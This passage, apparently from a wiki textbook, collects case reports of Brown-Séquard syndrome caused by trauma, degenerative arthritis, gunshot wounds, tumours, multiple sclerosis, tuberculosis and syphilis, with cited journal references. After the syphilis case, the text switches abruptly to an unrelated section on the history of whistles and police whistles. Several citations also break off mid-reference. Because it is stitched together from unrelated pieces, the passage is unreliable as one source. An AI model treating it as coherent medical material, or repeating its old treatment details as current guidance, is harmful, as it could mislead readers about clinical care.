room was caused by blood pooling in the legs secondary to spinal shock.

===Case 3: Automobile accident  === 
[[File:MRI C6 Fracture.jpg|left|thumb|MRI images showing C6 fracture dislocation with cord compression.]]
A 17 year old girl was riding with her friends in a convertible car.  Several of them were sitting on the top of the back seat without seatbelt restraint.  The car was traveling in excess of 70 miles an hour, when the driver made a sudden swerving in turn.  Several of the passengers were thrown from the car.  One was noted to be unconscious at the scene.  An ambulance was called.  Upon admission to the hospital she was noted to have a laceration over the top of the head.  She had lost a large amount of blood.  She was wavering in and out of consciousness.  Blood pressure was 90/70 with a pulse of 120.  Peripheral IVs were started with rehydration carried out. Examination revealed an epidural bleed in the right side of the brain.  Screening x-rays showed a C6 fracture dislocation.  She was placed in traction.  No other injuries were noted.  Abdomen and chest were within normal limits.  Since the epidural bleed was significant, it was surgically evacuated the night of admission.  On the third day, she regained consciousness and was noted to have lost motor function on the left side of her body and loss of sensation on the right.  A diagnosis of Brown-Sequard syndrome was made. Surgical stabilization of the cervical fracture was planned.  This was carried out on the sixth hospital day, with an anterior-posterior fusion from C5 to T1  and stabilization of the C6 fracture.  There was no improvement in her neurologic status after the surgery.  At two weeks, she was noted to have progressed to a complete tetraplegia (paralysis of both arms and legs).  She developed respiratory distress.  A tracheotomy was performed and she was placed on a ventilator.  On the 26th hospital day, she was noted to be in respiratory distress, blue and struggling.  A diagnosis of [[w:pulmonary embolism|pulmonary embolism]] was made.  Her course was downward. On the 40th hospital day, she died from sepsis secondary to pneumonia.  This case represents an unfortunate outcome of a severely injured patient.  It illustrates that a Brown-Sequard syndrome can progress to a complete paraplegia, despite adequate treatment.  &lt;ref&gt; van Middendorp, J. J., ''J. Trauma'' 2008, Oct. 65(4) 964-5 &lt;/ref&gt; &lt;ref&gt; ''J. Trauma'' 2008, Feb., 64 (2) 311-5 &lt;/ref&gt; &lt;ref&gt; ''Instructional Course Lecture'' 2004; 53:341-58 &lt;/ref&gt;  &lt;ref&gt; Irwin, Z. N. et al., ''Spine'' 2004, Apr 1, 29 (7):796-802 &lt;/ref&gt; &lt;ref&gt; ''Spine'' 1996, Feb. 15; 21(4):492-9 &lt;/ref&gt; &lt;ref&gt; Kerwin, A. J., et al ''J.

=== Case 4: Degenerative arthritis  === 
[[Image:CERVICAL_ARTHRITIS.jpg|right|thumb|X-ray showing advanced degenerative arthritis of the cervical spine with osteophyte formation, which can bruise the spinal cord in a fall.]]
A 72 year old woman experienced dizziness while taking a bath in her home.  She fell in the tub, experiencing a contusion to the back of the head and neck.  Her daughter heard the fall and called an ambulance.  At the hospital, she was found to have partially lost motor function on the right below C6 with almost total paralysis of the right arm and partial paralysis of the right leg.  She had lost sensation in the left arm, and had patchy loss of sensation in the left leg.  X-ray revealed advanced degenerative arthritis of the cervical spine.  MRI demonstrated a contusion of the spinal cord on the right at the C6 level.  The cervical ridges secondary to the degenerative arthritis are called osteophytes, and in this case, caused a contusion (bruise) to the spinal cord when she fell in the bath.  The diagnosis of Brown-Sequard Syndrome was made.  She reported that she had pain in the neck for several years, although during the last few years, her pain had been less.  She had seen a neurosurgeon ten years earlier, who had recommended a discectomy and fusion of C4-5 and C5-6.  She had declined his recommendation.   After a 6 week stay in the hospital, she was able to be discharged to a nursing facility With expectant therapy and physical therapy, she slowly gained back function over the next six months.  Recovery was incomplete.  After six months, she was able to ambulate with assistance and a walker.  Originally, bowel and bladder function had been interrupted.  These returned at six weeks after the injury.   

In a Japanese study of the postoperative prognosis of the hemihypalgesia (decreased sensation) in patients with Brown-Séquard-type myelopathy (BSM) caused by cervical lesions, it was discovered that all continued to have partial or complete loss, even if surgery was performed.  They evaluated the prognosis of BSM  in 16 (seven ossification of the posterior longitudinal ligament [OPLL], 5 cervical spondylosis [CS], and 4 disc herniation patients) out of 233 surgically treated patients with cervical diseases. The mean follow-up duration was 2 years and 11 months.  After surgery, none of these patients showed complete resolution of hemihypalgesia, although the most had an improvement in symptoms.  In the  Brown Sequard Myelopathy  series, OPLL occurred most frequently and the anterior element compressing the spinal cord existed most frequently in the central area of the vertebra.  Postoperative improvement in the motor function of the legs in the disc herniation group was significantly better than in the OPLL and CS groups  There were no significant differences in the functional prognosis between the BSM and non-BSM patient groups.  It was concluded Brown Sequard Myelopathy  patients can expect almost the same functional outcome as non-Brown Sequard Myelopathy  patients, with the exception of the disappearance of hemihypalgesia. &lt;ref&gt; Kohno, M., et al. ''Surg Neurol''. 1999 Mar, 51 (3):241-6 &lt;/ref&gt;

=== Case 5: Unilateral facet dislocation ===
[[Image:UNILATERAL FACET.JPG|left|thumb|250px|Drawing of a lateral cervical spine x-ray showing a unilateral facet dislocation, with a &lt;25% forward slipping of C5 on C6.]]
A 25 year old rode his motorcycle into the side of a truck at an intersection.  He lost consciousness and was noticed to have an open fracture of the left distal tibia and fibula above the level of the ankle. The neck was immobilized in the usual fashion.  He was transported to the hospital.  Exam showed motor paralysis of the left arm and leg with loss of sensation on the right side of his body.  Routine screening x-ray showed a unilateral facet dislocation at C5-6.  A drawing of the lateral cervical spine x-ray is shown at left.  There is an interruption  of the normal smooth anterior and posterior curve of the cervical vertebra, shown in red.  The forward slipping of C5 on C6 of less than 25% the width of the vertebra suggests the diagnosis of unilateral facet dislocation.  It was confirmed with an MRI.  Neurosurgery was consulted, and traction applied to the head and neck.  Over a period of five days, the unilateral facet dislocation was reduced.  It was thought to be unstable, so a posterior fusion was carried out.  The patient gained about 80% of his motor function and all of his sensation over the next six months.   The open tibial-fibula (leg) fracture was treated with an external fixator afer irrigation.  There was some skin loss over the fracture with an associated [[w:osteomyelitis|osteomyelitis]] (bone infection).  This required several more surgeries, including debridement of the infected bone and skin grafting.  Healing of the tibial and fibular fractures eventually occurred after 18 months.   After healing, he still had some difficulty with ambulation and found it necessary to walk with arm crutches.  He was markedly limited in his ability to walk or stand for any length of time.  He had trouble finding employment and sought permanent disability because of his significant impairments. &lt;ref&gt;  Wang, M. Y., et al. ''Neurosurgery''2003 Feb, 52 (2) 444-7 &lt;/ref&gt;  &lt;ref&gt; Shapiro, S. A., et al.  ''J. Neurosurgery'', 1999 Jul 91(1 Suppl): 19-24 &lt;/ref&gt;  &lt;ref&gt;  Shapiro, S. A. ''Neurosurgery'' 1993, Nov. 33 (5) 832-7 &lt;/ref&gt;

===Case 6: Gunshot wound ===

A case of stray bullet injury in a child was reported who presented with Brown-Sequard syndrome and CSF leak from the wound at the nape of neck. Patient was assessed by plain radiography and CT scans showing bullet lying in the cervical spinal canal under the C1 and C2 laminae. Laminectomy at C1/C2 level was done and bullet was carefully removed. Patient improved neurologically and CSF discharge stopped. The case report indicated the atypical neurological presentation and possibility of survival in high cervical spinal firearm injury.
&lt;ref&gt; ''J. Coll Physician Surg Pak''. 2008 May, 18(5): 312-3 &lt;/ref&gt;

A patient with a gunshot wound to the spinal cord with an incomplete neurologic deficit presented to the emergency room where  the neurologic examination revealed a combination of a [[w:central cord syndrome|central cord syndrome]] type injury and the Brown-Séquard Syndrome. It was speculated by the examining doctors that the Brown-Séquard portion of the syndrome was caused by compression of tracts within the spinal cord caused by the mass of the bullet and the central cord injury was produced by the kinetic energy of the bullet during penetration into the spinal canal. They conclude that with incomplete neurologic lesions following gunshot wounds the bullet be removed. 
&lt;ref&gt; J .Trauma, 1988 Nov. 28(11): 1600-2 &lt;/ref&gt;

===Case 7: Cavernous malformation ===
[[Image:SPINAL CORD BLEED.GIF|left|thumb|MRI of bleeding into a cavernous sinus within the spinal cord]]

A 17 year-old boy presented with [[w:diabetes insipidus|diabetes insipidus]] and [[w:delayed puberty|delayed puberty]]. The authors reported the first case of demonstrated de novo formation of an intramedullary cavernous malformation (CM)  following spinal radiation therapy.  Analysis of the literature has suggested that cavernous malformations (CMs) of the brain may be an acquired pathogenesis and a dynamic pathophysiological composition, with documented appearance of new lesions in familial cases and following radiotherapy Evaluation of endocrine levels revealed [[w:hypopituitarism|hypopituitarism]], and magnetic resonance (MR) imaging demonstrated an infundibular mass. The patient underwent a pterional craniotomy and removal of an infundibular [[w:germinoma|germinoma]]. The MR image of the spine demonstrated normal results. The patient received craniospinal radiation therapy and did well. He presented 5 years later with acute onset of back pain, lower-extremity weakness and numbness, and difficulty with urination. An MR image obtained of the spine revealed an intramedullary T-7 lesion; its signal characteristics were consistent with a cavernous malformation. The patient was initially managed conservatively but developed progressive myelopathy and partial Brown-Séquard syndrome. Although he received high-dose steroids and bed rest, his symptoms worsened. He underwent a costotransversectomy and excision of a hemorrhagic vascular lesion via an anterolateral myelotomy. Pathological examination confirmed features of a CM. The patient has done well and was walking without assistance within 4 weeks of surgery. De novo genesis of CMs may be associated with prior radiation therapy to the spinal cord. &lt;ref&gt; ''J. Neurosurg''. 1999 April: 90 (2 Supp) 124-8 &lt;/ref&gt;   Radiation therapy can cause cavernous malformations by destroying the malignant tissue, leaving an empty space which fills with blood or serous fluid.  If these enlarge progressively, increasing pressure on the surrounding neurologic tissue causing various deficits in nerve patterns.  In this case, the deficit fit the pattern of a partial Brown-Sequard syndrome.   See  infra for another report of cerebral-spinal germinoma causing a Brown Sequard syndrome.

===Case 8: Germinoma ===
Spinal cord [[w:germinoma|germinoma]] causing Brown Sequard syndrome has been reported in the Japanese literature.  &lt;ref&gt; ''No To Shinkei'' 1997, May 49 (5) 473-81 &lt;/ref&gt; 
[[Image:Testicular seminoma (1) nodal metastasis.jpg|left|thumb|Testicular seminoma showing pathology similar to a germinoma.]]


A 29-year-old man presented with [[w:diabetes insipidus|diabetes insipidus]] and [[w:cerebellar ataxia|cerebellar ataxia]] who developed spinal cord swelling 15 years after the onset. He was well until 14 years of the age when he noted dizziness. Two years after there was an onset of gait disturbance and slurred speech. He also noted polydipsia and polyuria. He was evaluated at the neurosurgery service of our hospital when he was 17 years of the age. Neurologic examination at that time revealed memory loss, horizontal nystagmus, cerebellar ataxic gait, dysmetria and decomposition more on the left. Cranial CT scan revealed a mass lesion involving the left subthalamic region and the head of the caudate area. [[w:spinal fluid|Spinal fluid]] was unremarkable, however, [[w:human chorionic gonadotropin|human chorionic gonadotropin]] was increased to 27 mIU/ml. He was treated by radiation therapy (3,000 rads for total brain area and 5,460 rads for focal region). His CT scan and memory loss improved, however, cerebellar ataxia was unchanged. Three years after the radiation, he started to show choreic movement in his neck and left upper extremity. [[Image:Seminoma of the Testis.jpg|right|thumb|Most seminomas originate in the testicle, however some can arise de novo in the brain as in this case.]]
He was admitted to our service in August 14, 1995 when he was 29 years of the age. On admission, he was alert but disoriented to time; calculation was also poor. Higher cerebral functions were intact. The optic fundi were normal without papilledema. Visual field appeared intact.   Gaze [[w:nystagmus|nystagmus]] was observed in all the directions, but more prominent in the horizontal direction. Speech was slurred. Otherwise, cranial nerves were unremarkable. Motor wise, he showed marked truncal and gait [[w:ataxia|ataxia]]; he was unable to walk because of ataxia. Muscle atrophy and marked weakness was noted in both upper extremities more on the left side. Deep tendon reflexes were diminished in the upper extremities but active in the lower extremities. He was polyuric; urinary specific gravity was low. Spinal fluid contained 6 cells/cmm and 113 mg/ dl of protein; Queckenstedt was positive. MRI revealed swelling of the cervical cord; in addition, the entire cervical region and the medullar oblongata appeared as high signal intensity areas. No mass lesion was noted in the supratentorial structures but the third ventricle was markedly enlarged. Surgical biopsy was performed on the cervical lesion. The patient was discussed in neurologic CPC, and the chief discussant arrived at the conclusion that the patient had germinoma with syncytiotrophoblastic giant cells in the diencephalic region which appeared to have been cured by radiation therapy; he thought that the cervical lesion was the seeding of germinoma. Cerebellar ataxia was ascribed to the remote effect of germinoma. Most of the participants thought that the original tumor was germinoma and the cervical lesion was its spread. Some participants thought that his ataxia was caused by germinoma cells involving the medulla and the inferior cerebellar peduncles. Histologic observation of the biopsied tissue from the spinal cord revealed the typical two cell patterned germinoma. Most of the tumor cells were not stained for an antibody against HCG, but some tumor cells were positively stained. Germinoma is very radio-sensitive; this patient showed T2 high signal lesion involving the medulla oblongata and cervical cord continuously. Probably, tumor cells in the lower brain stem escaped radiation, and gradually spread to the spinal cord over many years. At the time of operation, the surface of the spinal cord was free from tumor cells. Therefore, tumor cells invaded the spinal cord continuously from the medulla oblongata. He was treated with cervical radiation, and his neurologic as well as radiologic findings showed marked improvement.

===Multiple Sclerosis ===
[[Image:MULTIPLE SCLEROSIS.JPG|left|thumb|250px|[[w:magnetic resonance imaging|Magnetic Resonance Image]] with enhancement showing [[w:multiple sclerosis|multiple sclerosis]] of the cervical spine.]]

[[w:multiple sclerosis| Multiple Sclerosis]] presenting as Brown Séquard syndrome.   
A case of probable multiple sclerosis (MS) in the cervical cord without brain involvement, mimicking a tumor has been reported. The patient had a progressive left Brown-Séquard syndrome. The diagnosis was suggested by MRI. In spite of intensive corticotherapy, the neurological status worsened, in parallel with the radiological findings. Biopsy excluded an intramedullary tumour and supported the diagnosis of MS. &lt;ref&gt; ''Neuroradiology'' 1994; Apr, 36 (3) 234-5 &lt;/ref&gt; 
The Brown-Séquard syndrome as spinal hemiplegia with contralateral sensory deficits has been related to a variety of underlying diseases. We describe the case of a 35-year-old right-handed white female presenting with a Brown-Séquard syndrome as the first and sole symptom of multiple sclerosis, underscoring the importance of multiple sclerosis as a rare condition for the Brown-Séquard syndrome. (MS) is an idiopathic inflammatory demyelinating disease of the CNS. Patients with MS commonly present with an individual mix of neuropsychological dysfunction, which tends to progress over years to decades. 
The diagnosis of MS is based on a classic presentation (ie, optic neuritis, transverse myelitis, internuclear ophthalmoplegia, paresthesias) and on the identification of other neurologic abnormalities, which may be indicated by the patient history and exam. Typical findings on an MRI also help establish a diagnosis of MS. 
By convention, the confidence in the diagnosis of MS is described as definite, probable, or possible MS. It includes a classification with respect to clinical presentation, which correlates somewhat with the prognosis and is useful in clinical trials.
About 70% of patients present with the more favorable relapsing-remitting (RR) type, which is characterized by acute exacerbations with full or partial remissions.
Therapy for those with chronic progressive MS is less satisfying than for those with RR. Patients with an inflammatory component may respond to corticosteroids, beta-interferons, or intravenous cyclophosphamide ([[w:cytoxan|Cytoxan]]), and one study found modest impact on disease progression when the patients were given a low dose of methotrexate. Mitoxantrone is sometimes recommended for patients with rapidly progressive symptoms.

MS is regarded as an autoimmune disease. Most of what is known about MS is derived from its model in animal research, which is experimental allergic encephalomyelitis.
The pathologic hallmark of MS is multicentric, multiphasic CNS inflammation and demyelination. Originally, each MS lesion was thought to evolve through episodes of demyelination and remyelination into a chronic burned-out plaque with relative preservation of axons and gliosis. Thus, the neuropsychological dysfunction occurred, despite an essentially intact neural network, until late in the disease course. However, recent studies have demonstrated that axonal transections do occur during acute exacerbations; furthermore, axonal damage, as measured by magnetic resonance spectroscopy, was found to correlate with clinical disability. 
For unclear reasons, lesions characteristically involve the optic nerve and periventricular white matter of the cerebellum, brain stem, basal ganglia, and spinal cord. Identifying MS lesions in gross specimens is difficult, as is identifying MS lesions in gray matter on radiographic images; hence, the predilection for white matter may not be disease related. The peripheral nervous system rarely is involved. &lt;ref&gt; Lazoff, M. emedicine “Multiple Sclerosis” &lt;/ref&gt;   This case represents an unusual presentation of Multiple Sclerosis because it occurred in the spinal cord without evidence of pathology in the central nervous system.  &lt;ref&gt; ''Rev. Neurol''. 1998, Nov. 27 (159) 836-7 &lt;/ref&gt; &lt;ref&gt; ''J. Neurol. Sci'' 1998, 156 (1) 112-3 &lt;/ref&gt;

===Hematoma secondary to blood thinner  ===

52 year old man on blood thinner developed motor paralysis below C7 on the left and loss of sensation and proprioception below C7 on the contralateral side was reported.  MRI showed an epidural hematoma at C7-T1.  A cervical laminectomy with accomplished on an emergency basis with  evacuation of the hematoma, which was outside the spinal cord, but pressing on it.  Post-operatively, there was a complete resolution of neurologic function. &lt;ref&gt; ''J. Emerg. Med''. 2007, Oct. 33 (3) 241-4 &lt;/ref&gt; &lt;ref&gt; ''Neurol.

===Spinal cord infarction ===

Posterior spinal cord infarction presenting Brown-Séquard syndrome has been reported in Japan.
A 56 year-old-woman with spinal cord [[w:infarction|infarction]] (loss of blood supply) presented to the hospital. She experienced left-sided girdle pain without precipitating symptoms and she developed monoparesis (paralysis of one leg) of her left leg and urinary retention. She also presented the segmental loss of total sensations in the Thoracic 10-11 area of the left trunk, the disturbance of position and vibration senses in the left leg and the disturbance of pain and temperature senses in the right leg. T2-weighted MRI imagings showed high signal intensity lesion in the left half of the spinal posterior column at Th9-10 vertebral levels. Somatosensory evoked potentials confirmed that the loss of position and vibration senses was unilateral. Though she became able to walk with canes two months later, her sensory disturbance showed no improvement. This is a rare case of unilateral posterior spinal cord infarction presenting Brown-Séquard syndrome.   &lt;ref&gt; ''Rinsho Shinkeigaku'' 2005 Oct, 45 (10):730-4 (Article in Japanese) Department of Neurology, National Hospital Organization Hyogo Chuo National Hospital  &lt;/ref&gt;

===Syringomyelia ===

[[Image:Syringomyelia.jpg|right|thumb| MRI demonstrating [[w:syringomyelia|syringomyelia]] of the cervical spine, shown in the gray linear mass within the spinal cord.]] 
[[w:syringomyelia|Syringomyelia]] is a pathologic condition which is caused by a fluid filled cavity within the center of the spinal cord.  The sac is called a syrinx.  These can enlarge, causing a myriad of neurologic presentations, including Brown Sequard syndrome and its variants.  Two cases have been reported of syrinx associated with an intramedullary metastasis. The first presented with hyperaesthesia in the right arm and bilateral pyramidal leg weakness, the second with a partial right sided Brown Sequard syndrome with a sensory level at D6 (T6) . Possible mechanism are discussed. . &lt;ref&gt; Foster, O., Crockard, H. and Powell, M.  ''J. Neurol. Neurosurg Psychiatry'', 1987, Aug. 50(8):1067-70 &lt;/ref&gt; A third  patient having intramedullary spinal cord metastasis associated with syringomyelia has been reported. The diagnosis was confirmed by magnetic resonance imaging, in a patient who had poorly differentiated carcinoma of the lung. The patient responded to treatment with steroids and radiotherapy, with complete resolution of neurologic symptoms and syringomyelia. Intramedullary spinal cord metastasis is relatively rare. &lt;ref&gt; Keung, Y. K., Cobos, E. et al.,  ''Am. J. Clin. Oncol''. 1997, Dec, 20(6): 577-9 &lt;/ref&gt; 

Based on examination of  19 patients with syringomyelia and on the related literature, including the differential diagnosis, postoperative evaluation and the dynamics of CSF and cyst fluids, using magnetic resonance imaging (MRI), the following conclusions can be drawn: 1. MRI is the preferred method of investigation for diagnosis and differential diagnosis of syringomyelia. 2. Using MRI, it is possible to study fluid flow in the vertebral canal and the movements of the syrinx fluid. The data are as yet limited, but in the future will form an important contribution to our understanding of the pathogenesis of syringomyelia and to the choice of a treatment method. 3. MRI is important for the postoperative follow-up of patients with syringomyelia, including tracking the cyst and detecting complications.&lt;ref&gt; Tanghe, H. L. ''Acta Neurochir (Wien)'' 1995, 134 (1-2) 93-9 &lt;/ref&gt; 
Syringomyelia causes progressive myelopathy. Most patients with syringomyelia have a Type I [[w:Arnold-Chiari malformation|Arnold-Chiari malformation]]   of the cerebellar tonsils. Pathophysiological mechanisms underlying the progression of syringomyelia are associated with the Chiari Type I malformation which are frequently seen with the condition.   In a study of  20 adult patients with both Arnold-Chiari Type I malformation and symptomatic syringomyelia, testing before surgery included the following: clinical examination; evaluation of anatomy by using T1-weighted magnetic resonance (MR) imaging and  evaluation of the syrinx.  Compared with healthy volunteers, before surgery, the patients had decreased anteroposterior diameters of the ventral and dorsal CSF spaces at the foramen magnum.   The maximum syrinx diameter decreased on MR imaging in all patients. Cine MR imaging documented reduced velocity and flow of the syrinx fluid. Clinical symptoms and signs improved or remained stable in all patients, and the tonsils resumed a normal shape.  The progression of syringomyelia associated with Arnold-Chiari Type I malformation is produced by the action of the [[w:cerebellar tonsils|cerebellar tonsils]], which partially occlude the subarachnoid space at the foramen magnum and act as a piston on the partially enclosed spinal subarachnoid space. This creates enlarged cervical subarachnoid pressure waves that compress the spinal cord from without, not from within, and propagate syrinx fluid caudally with each heartbeat, which leads to syrinx progression. The disappearance of the abnormal shape and position of the tonsils after simple decompressive extraarachnoidal surgery suggests that the Arnold-Chiari Type I malformation of the cerebellar tonsils is acquired, not congenital. Surgery limited to suboccipital craniectomy, C-I laminectomy, and duraplasty eliminates this mechanism and eliminates syringomyelia and its progression without the risk of more invasive procedures. &lt;ref&gt; Heiss, J. D., et al. ''J. Neurosurg'' 1999 Oct, 91 (4) 553-62 &lt;/ref&gt;

===Renal Cell Carcinoma ===
[[File:Renal clear cell ca (1) Nephrectomy.jpg|left|thumb|The diagnosis of a [[w:meatastatic lestion|metastatic lesion]] to the spinal cord can be made by biopsy, such as this [[w:clear cell carcinoam|clear cell carcinoma]] of the kidney.]] 

Any [[w:metastatic cancer|metastatic cancer]] to the spinal cord can cause a Brown-Sequard syndrome or its variants.  In clinical practice, these are rare.  A patient  presented with a solitary neoplasm of the intramedullary spinal cord.  The tumor caused findings of Brown-Séquard syndrome and was the initial presentation of widely metastatic renal cell carcinoma (RCC). Metastasis of the intramedullary spinal cord has been uncommonly reported and is extremely rare as the initial sign of a disseminated carcinoma.  The tumor was resected, and the patient's neurologic deficits slowly improved. The histopathology suggested an epithelioid neoplasm. However, despite expert review, the diagnosis was nonspecific, and the tumor appeared benign.  It soon recurred in the spinal cord, and repeat imaging studies showed numerous new metastases and a primary renal neoplasm. Biopsy and a repeat histopathologic analysis confirmed RCC, and the patient died of disseminated disease within another 2 months.  Despite being uncommon, spinal cord metastases should be considered in some patients before surgery because it may expedite diagnosis, mitigate the need for surgery, and improve the quality of life for these patients. Clinical factors suggesting metastasis include a personal or family history of malignancy or conditions predisposing to it, the presence of multiple tumors in the spinal cord or elsewhere, nonspecific constitutional symptoms, such as weight loss or decreased appetite, and, specifically for RCC, an abnormally increased hematocrit. &lt;ref&gt; Donovan, D. J., and Freeman, J. H., ''Spine'', 2006, Jun 15, 31(14):6460-3 &lt;/ref&gt;
In another case, the authors reported  of a 70-year-old woman who developed a Brown-Sequard-syndrome within 6 weeks caused by an intramedullary spinal cord metastasis of an occult renal cell carcinoma. Intramedullary metastases are rare and represent only 4-8.5% of central nervous system metastases. An important feature of intramedullary metastases is the rapid progression of neurological deficits which necessitates rapid treatment. There are only eight earlier reports of intramedullary metastasis due to renal cell carcinoma &lt;ref&gt; Schiff D, O'Neill BP. Intramedullary spinal cord metastases: clinical features and treatment outcome. ''Neurology'' 1996;47:906-12; &lt;/ref&gt; &lt;ref&gt;  Belz P.

Coexistent intramedullary metastasis and syringomyelia of cervical spinal cord. Report of a case. ''Neurology'' 1960;674-8 &lt;/ref&gt;  The authors reported that to the best of their knowledge this was the first report on a patient in whom symptoms from the metastasis of a renal cell carcinoma preceded the detection of the primary tumor. This report presents the clinical, neuroradiological and histopathological findings of an intramedullary metastasis of a renal cell carcinoma and provides an overview of the literature on intramedullary spinal cord metastases. &lt;ref&gt; Schijns, et al., ''Clin Neurol Neurosurg'' 2000, Dec. 102(4):249-254 &lt;/ref&gt; However, there have been other cases where the presence of a metastasis causing a Brown Sequard syndrome, or a variation of it was the first sign of a renal cell carcinoma. In a Spanish case,  a 69 year-old male without known antecedent  presented with a clinical loss of distal force in his lower limbs during the last two months. Magnetic resonance imaging (MRI) showed an intramedullary spinal cord mass at the level of the medullaris cone. The patient was operated on; the histological diagnosis was clear cells carcinoma suggestive of metastasis from an unsuspected renal tumor that was later confirmed with an abdominal CT. When the patient's state is good, surgery can correct the neurological deficit produced by an intramedullary spinal cord lesion. The neurological state of the patient improved after the intervention, and 14 months after surgery, he had no neurological deficit in the lower limbs. &lt;ref&gt; Gomez de la Riva, et al.  ''Neurocirugia (Astur)'' 2005, Aug; 16(4)359-64 &lt;/ref&gt;   &lt;ref&gt; ''Ann. Oncol'' 2001, Aug, 12(8):1173-7 &lt;/ref&gt;

=== Lung cancer ===
[[File:Lung small cell carcinoma (1) by core needle biopsy.jpg|left|thumb|Biopsy demonstrating [[w:small cell carcinoma|small cell carcinoma]] of lung ([[w:oat cell carcinnoam|oat cell carcinoma]]) typically seen in metastatic lesions.]]
Four patients with intramedullary spinal cord metastases from small cell carcinoma of the lung (SCCL) were described, with emphasis on clinical presentation and treatment. All patients developed the Brown-Séquard syndrome due to intramedullary tumor in the cervical spinal cord, three within 2 mo after combined modality treatment using chemotherapy and radiotherapy. One patient presented with a Brown-Séquard syndrome and an extradural spinal cord compression from tumor. The radiological and cerebrospinal fluid findings are presented and discussed. Radiation treatment was administered to the involved segments of spinal cord in each patient. All patients responded; two for 3 and 7 mo, two for 3 and 4 wk, respectively. There was significant improvement in the quality of life for three of the four patients. &lt;ref&gt; Murphy, et al., ''J. Clin. Onc''. 1983 Feb. 1 (2):99-106 &lt;/ref&gt; &lt;ref&gt; Yamamoto, ''T. Gann''. 1950, Dec 41 (24): 285-7 &lt;/ref&gt; 
[[File:Thorax CT peripheres Brronchialcarcinom li OF.jpg|right|thumb|MRI of the thorax showing a lung cancer.]]

Intramedullary metastases are very rare. Four cases verified by autopsy were reported. The site of the primary tumor was the lung (three cases) and the breast (one case). One case was complicated by a Brown-Séquard syndrome. We found 96 cases of intramedullary metastases in the literature. The primary tumor sites were lung (49%), breast (14%), kidney (6%) and colo-rectal region (5%). Melanoma was noted in 6% and Hodgkin's disease in 4% of the cases. Other primary tumors comprised 9%. The intramedullary metastases were most commonly thoracic.  &lt;ref&gt; Schwechheimer, K, Lemminger J., ''Clin Neuropathol''. 1985, Jan-Feb., 4 (1):28-37 &lt;/ref&gt;  In another report, the authors reviewed records retrospectively from 1980 to 1993 to identify patients with histologically confirmed systemic cancer, clinical features of myelopathy, and either tissue-proven ISCM or abnormal neuroimaging findings consistent with ISCM. They identified 40 patients who fulfilled these criteria. In nine, ISCM was the initial presentation of cancer. Nineteen patients had lung primaries (small cell in 12). Twenty-one patients had pain, 35 had demonstrable sensory loss, 37 had weakness, and 25 had urinary incontinence at presentation. Nine patients had true Brown-Séquard syndrome and nine others had pseudo-Brown-Séquard syndrome. Median duration of symptoms at diagnosis was 28 days (range 3 days to 18 months). Thirteen patients had prior brain metastasis, nine had brain metastasis simultaneous with ISCM, and one had brain metastasis after ISCM; 11 had concomitant leptomeningeal metastases. Spinal magnetic resonance findings were abnormal in 30/30 patients, myelographic results were abnormal in 16/20, and eight had pathologic confirmation of ISCM. Thirty-five patients had radiotherapy and five had surgery; four were untreated or treated elsewhere. Median survival was 4 months for patients receiving radiotherapy and 2 months for patients not receiving radiotherapy. Eleven patients survived &gt; 6 months. Twenty-three were ambulatory at ISCM diagnosis, and 21 were ambulatory at letest follow-up. We conclude that ISCM as the initial presentation of malignancy is not rare, and hemicord syndromes occur frequently. Although long-term survival is poor, treatment preserves ambulation in most patients still ambulatory at diagnosis. Focal radiotherapy is indicated in most patients.

===Tuberculosis===
[[File:Tuberculosis-x-ray-1.jpg|right|thumb|Typical chest x-ray in advanced [[w:tuberculosis|tuberculosis]].]]

A case from Korea reporting a Brown-Sequard syndrome secondary to tuberculosis of the spine in a [[w:systemic lupus eruthematosis|systemic lupus erythematosis]] patient:  A 25-year-old girl presented with progressive deterioration of right side weakness with decreased sensation on the left trunk. She had been treated with high dose steroid due to autoimmune thrombocytopenia for 2 months. Clinical, laboratory and immunologic studies revealed that she had systemic lupus erythematosus (SLE), MRI of spinal cord showed marginal contrast enhancing and fluid containing mass in the cord of the C5-6 level, suggesting intramedullary abscess. She underwent surgery of mass removal with biopsy. The pathologic findings from cord tissues revealed numerous acid fast bacilli (AFB) in necrotic tissues. After surgery and anti-tuberculous treatment, her neurologic symptoms were markedly improved with restoration of right side motor weakness. To our knowledge, this is the first case report of intramedullary tuberculosis in a patient with SLE. Since intramedullary tuberculosis may sometimes mimic neurologic complication of SLE itself, it may pose diagnostic and therapeutic confusion for clinicians. We report a case of spinal cord tuberculosis affecting C5, 6 level which was manifested as Brown-Séquard syndrome in a patient with SLE.  &lt;ref&gt; Kim, W. U., et al., ''Lupus'', 2000, 9(2)147-50 &lt;/ref&gt;

A report from South Africa highlights reviewed cases of spinal tuberculosis with varying degrees of neurologic involvement.   The incidence of tuberculosis (TB) is increasing in both developing and developed worlds, and children, in particular, represent a high-risk group for acquiring the disease. TB of the central nervous system is the most severe, life-threatening form of TB in infants and children. Approximately 10% of all patients with TB have central nervous system involvement.  for this paper, the authoes selected four pediatric cases of unusual spinal TB that presented to their institution during the last 5 years. These include TB arachnoiditis, intramedullary spinal cord tuberculoma, TB spondylitis of the odontoid peg, and one child with tuberculous extradural abscess. TB may involve the intramedullary, extramedullary intrathecal compartment, or the extrathecal vertebral compartment in the form of an arachnoiditis, abscess, and spondylitis, respectively, often with unusual imaging presentations.  &lt;ref&gt; du Plessis, J. et al., ''Childs Nerv Syst'' 2008, Apr, 24(4):453-7 &lt;/ref&gt;

===Syphilis  ===
A man aged 31 presented to hospital with acute onset of weakness in the legs, sensory loss, and disturbance of bladder and bowel function. Incomplete Brown-Séquard syndrome secondary to meningovascular syphilis of the spinal cord was diagnosed after serological tests for syphilis gave positive results. His condition was probably caused by endarteritis of the arteria radicularis magna of Adamkiewicz. He was treated with procaine penicillin 1.8 MIU intramuscularly once a day and probenecid 0.5 g by mouth three times a day for 21 days followed by physiotherapy and rehabilitation. Considerable neurological recovery was expected. To our knowledge this association has not been reported previously in detail in an English publication. &lt;ref&gt; ''Genitourin Med''. 1989, June, 65 (3): 189-191 &lt;/ref&gt;

==1. Relate briefly the history of whistle making and tell why whistles were invented.==
The whistle has its roots dating back to ancient China, where night watchmen would blow into the tops of acorns to alert the towns to invading Mongolians. In ancient Egypt two blades of the papyrus plant along the Nile river were held together in between the palms. By blowing into the palms the papyrus leaves would make a loud vibrant sound.

=== Police whistles ===
[[Image:Police whistles.jpg|thumb|Examples of police whistles]]

In England since the Metropolitan Police Services inception in 1829, officers have been issued with the &quot;Metropolitan&quot; whistle. Prior to this, police used hand rattles, with whistles only being used as musical instruments or toys. Both rattles and whistles were used to call for back-up in areas where neighbourhood beats overlapped, and following their success in London, the whistle was adopted by most counties in England. 

